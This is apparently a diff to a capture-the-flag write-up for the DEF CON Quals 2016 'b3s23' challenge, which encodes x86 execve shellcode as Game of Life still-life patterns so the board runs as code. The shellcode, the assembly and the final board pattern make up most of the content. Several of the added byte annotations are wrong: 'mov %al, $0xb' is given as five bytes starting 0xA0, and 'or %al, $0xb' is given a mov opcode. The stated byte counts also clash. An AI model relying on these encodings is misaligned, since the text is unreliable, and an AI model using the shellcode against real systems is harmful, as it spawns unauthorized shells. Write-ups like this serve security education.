@@ -76,7 +76,7 @@ mov    %dl, 0x0         ; "\xB2\x00"
 push   %eax             ; "\x50"
 push   %ebx             ; "\x53"
 mov    %esp,%ecx        ; "\x89\xCC"
-mov    %al, $0xb        ; "\xB0\x0B"
+mov    %al, $0xb        ; "\xA0\x00\x00\x00\x00"
 int    $0x80            ; "\xCD\x80"     
 ```
 This shellcode accomplishes the following,
@@ -91,7 +91,7 @@ This shellcode accomplishes the following,
 8. Moves the system call number for execve into al
 9. Invokes the system call
 
-I decided to attempt to encode the shellcode using only still life constructions. This would ensure that the entire construction would remain during the 15 iterations. At 25 bytes, the binary encoding of this shellcode would eventually wrap around the 110 bits of the first line of the game board. Wrapping would complicate the ability to stabilize the still life constructions. Therefore, I decided to try and reduce the size of the shellcode to only 13 bytes. 
+I decided to attempt to encode the shellcode using only still life constructions. This would ensure that the entire construction would remain during the 15 iterations. At 28 bytes, the binary encoding of this shellcode would eventually wrap around the 110 bits of the first line of the game board. Wrapping would complicate the ability to stabilize the still life constructions. Therefore, I decided to try and reduce the size of the shellcode to only 13 bytes. 
 
 By setting a breakpoint at `0xf661e000`, the address of the game board, I would be able to determine the state of the registers prior to executing the shellcode. The result was the following
 
@@ -125,37 +125,52 @@ Unfortunately, the first bit is not a 1. Therefore I would need to set the coord
    00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 ```
 
-With this construction in place the shellcode was simplified to the following 10 bytes,
+With this construction in place the shellcode was simplified to the following 14 bytes,
 
 ```assembly
+inc    %ebx             ; "\x43"
 mov    %dl, 0x0         ; "\xB2\x00" 
 push   %eax             ; "\x50"
 push   %ebx             ; "\x53"
 mov    %esp,%ecx        ; "\x89\xCC"
-mov    %al, $0xb        ; "\xB0\x0B"
+mov    %al, $0xb        ; "\xA0\x00\x00\x00\x00"
 int    $0x80            ; "\xCD\x80"   
 ```
-This results in the following 80-bit binary pattern,
-
-```
-1011 0010 0000 0000 0101 0000 0101 0011 1000 1001 1100 1100 1011 0000 0000 1011 1100 1101 1000 0000
-```
-
-Unfortunately, I was unable to find a stable construction for `mov %esp, %ecx`. So I had to replace this instruction with
-
+I then replace `mov %al, $0xb` with `or %al, $0xb` to eliminate 3 bytes. Unfortunately, I was unable to find a still life construction for `mov %esp, %ecx`. So I had to replace these instructions with
 ```assembly
 push esp
-pop ecx
+pop  ecx
 ```
-
 resulting in the following shellcode
-
 ```assembly
+inc    %ebx             ; "\x43"
 mov    %dl, 0x0         ; "\xB2\x00" 
 push   %eax             ; "\x50"
 push   %ebx             ; "\x53"
-push esp                ; "\x54"
-pop ecx                 ; "\x59"
-mov    %al, $0xb        ; "\xB0\x0B"
+push   esp              ; "\x54"
+pop    ecx              ; "\x59"
+or     %al, $0xb        ; "\xB0\x0B"
 int    $0x80            ; "\xCD\x80" 
 ```
+With some additionally shuffling of instructions, I was eventually able to find a still life construction for the following shellcode
+```assembly
+inc    %ebx             ; "\x43"
+push   %eax             ; "\x50"
+push   %ebx             ; "\x53"
+or     %al, $0xb        ; "\xB0\x0B"
+push   esp              ; "\x54"
+pop    ecx              ; "\x59"
+mov    %dl, 0x0         ; "\xB2\x00" 
+int    $0x80            ; "\xCD\x80" 
+```
+The final Game of Life still life construction for the shellcode was
+```
+01000011010100000101001100001100000010110000110000001000010101000101100110110010000000001100110110000000000000
+10100001011010000110100100001100000011010000110000010100101110100110100110110011100000001100110110000000000000
+01000010000010000000110000000000000000000000000000001000100000100000000000000000010000000000000000000000000000
+00000010110100000110100000000000000000000000000000000000010101000000000000000011100000000000000000000000000000
+00000001011000000100100000000000000000000000000000000000001101100000000000000010000000000000000000000000000000
+00000000000000000011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+```
+A python solver for this challenge is available [here](https://github.com/samuraictf/writeups/blob/master/defconquals2016/b3s23/b3s23_solve.py)
